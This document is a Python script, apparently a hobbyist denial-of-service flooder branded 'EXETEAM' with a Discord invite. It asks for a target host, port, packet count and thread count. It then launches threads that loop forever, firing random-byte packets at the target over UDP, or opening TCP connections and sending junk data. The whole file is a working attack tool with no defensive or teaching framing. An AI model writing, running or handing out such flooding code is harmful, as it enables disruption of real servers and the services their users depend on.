#!/usr/bin/env python3
import random
import socket
import threading
import os

os.system("clear")
print ("                   ")      
print ("\ \ / /     \ \ / ()      |  /")      
print ("\ V /    \ V /        / /     ")
print ("/   / |  /   | | ' \   / / | | | |")
print ("/ /^\ \ \ / /^\ \ | | | |./ /|  |")
print ("/   // /   / ||__/,|")                                                               

print       (" >> TOOLS CREATED BY EXETEAM <<")
print       (" >> DISCORD : EXE TEAM << ")
print       (">> DON'T ABUSE MY TOOLS <<")                                   
print       (" >> DM ME IF YOU NEED HELP <<")
print       (" >> JOIN OUR COMMUNITY AND LEARN TOGETHER<<")
print       (" >> https://discord.gg/GQr8EdGcds <<")
    
ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Gas kah Kids?(y/n):"))
times = int(input(" Paket:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"  EXETEAM ATTACKED THE SERVER")
		except:
			print("[!] EXETEAM KIRIM PAKET!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" EXETEAM ATTACKED THE SERVER ")
		except:
			s.close()
			print("[] EXETEAM KIRIM PAKET")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()